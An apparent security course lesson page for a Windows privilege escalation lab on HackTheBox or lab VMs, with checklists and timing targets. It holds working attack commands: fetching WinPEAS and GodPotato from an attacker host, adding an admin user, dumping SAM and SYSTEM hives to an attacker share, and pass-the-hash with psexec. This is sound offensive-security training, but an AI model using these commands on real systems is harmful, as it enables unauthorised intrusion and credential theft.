---
title: "Infrastructure Practice Day 6 — Windows PrivEsc Lab"
tags: [practice, windows, privilege-escalation, SeImpersonate, GodPotato,
       unquoted-service, SAM-dump, pass-the-hash, T1134, T1574, ATT&CK]
module: 04-BroadSurface-04
day: 251
related_topics:
  - Windows PrivEsc Enumeration (Day 238)
  - Windows PrivEsc Lab (Day 239)
  - Post-Exploitation Basics (Day 241)
  - Infrastructure Practice Day 7 (Day 252)
---

# Day 251 — Infrastructure Practice Day 6: Windows PrivEsc Lab

> "Windows escalation rewards the patient enumerator. WinPEAS runs fast. The
> hard part is reading its output correctly — distinguishing a real finding
> from a false positive. Today you practice both: running the tool and
> verifying each result manually before attempting exploitation."
>
> — Ghost

---

## Goals

By the end of today's session you will have:

1. Completed a full WinPEAS enumeration and manually verified its top 3 findings.
2. Exploited SeImpersonatePrivilege via GodPotato.
3. Exploited an unquoted service path.
4. Dumped SAM hashes and used them for pass-the-hash.
5. Measured your time for each phase.

**Time budget:** 6 hours.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Windows PrivEsc enumeration methodology | Day 238 |
| GodPotato and unquoted service exploitation | Day 239 |
| SAM dump and PtH | Day 241 |

---

## Target

```
Option A: HackTheBox Windows machine (Easy/Medium)
  Recommended: Devel, Optimum, Bounty, Jeeves

Option B: Lab Windows VM
  User: labuser / Password123!
  IP: 10.10.10.5
  RDP: xfreerdp /u:labuser /p:'Password123!' /v:10.10.10.5
  WinRM: evil-winrm -i 10.10.10.5 -u labuser -p 'Password123!'
```

---

## Phase 1 — Enumeration (Target: < 20 min)

```powershell
# Upload and run WinPEAS
mkdir C:\Temp
Invoke-WebRequest -Uri http://<attacker-ip>:8000/winPEASx64.exe -OutFile C:\Temp\wp.exe
C:\Temp\wp.exe | Tee-Object -FilePath C:\Temp\winpeas-out.txt

# Manual spot checks (run alongside WinPEAS):
whoami /priv
whoami /groups
net localgroup administrators
```

```
Top 3 WinPEAS RED findings:
  1. ___
  2. ___
  3. ___
Manual verification of each (confirmed real / false positive):
  1. ___
  2. ___
  3. ___
```

---

## Phase 2 — SeImpersonate Exploitation (if applicable)

```powershell
# Check: SeImpersonatePrivilege present and enabled?
whoami /priv | findstr Impersonate
# Enabled → proceed

# Download and run GodPotato:
Invoke-WebRequest -Uri http://<attacker-ip>:8000/GodPotato-NET4.exe -OutFile C:\Temp\gp.exe
C:\Temp\gp.exe -cmd "cmd /c whoami"
# Expected: nt authority\system
```

```
[ ] SeImpersonate confirmed enabled
[ ] GodPotato executed
[ ] Output confirmed SYSTEM
[ ] Admin user added: net user ghost Password123! /add
Time taken: ___ min
```

---

## Phase 3 — Unquoted Service Path (if applicable)

```powershell
# Find unquoted paths:
Get-WmiObject Win32_Service | Where-Object {
  $_.PathName -notmatch '"' -and $_.PathName -match ' '
} | Select-Object Name, PathName

# Check writability of intermediate paths
# Exploit: copy payload to writable intermediate path
# Restart service
```

```
[ ] Unquoted service identified: ___
[ ] Intermediate writable path: ___
[ ] Payload placed
[ ] Service restarted
[ ] SYSTEM shell received
Time taken: ___ min
```

---

## Phase 4 — Post-Escalation (Target: < 15 min)

```powershell
# SAM dump via reg save:
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\sys
# Transfer to attacker:
# impacket-smbserver share C:\Temp
# copy C:\Temp\sam \\<attacker-ip>\share\
```

```bash
# Offline dump:
secretsdump.py -sam sam -system sys LOCAL
# Record all NT hashes:
```

```bash
# PtH lateral movement:
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> \
  Administrator@<second-target-ip>
```

```
[ ] SAM dumped
[ ] NT hashes recorded
[ ] PtH tested: Y / N
[ ] Second host accessed: Y / N
```

---

## Session Timing

| Phase | Target | Actual |
|---|---|---|
| WinPEAS enumeration + verification | < 20 min | ___ |
| Exploitation (primary path) | < 15 min | ___ |
| SAM dump + PtH | < 15 min | ___ |
| **Total** | < 50 min | ___ |

---

## Questions

> Add your questions here. Each question gets a Global ID (Q251.1, Q251.2 …).

---

## Navigation

← Previous: [Day 250 — Milestone 250 Days](DAY-0250-Milestone-250-Days.md)
→ Next: [Day 252 — Infrastructure Practice Day 7](DAY-0252-Infrastructure-Practice-Day-7.md)
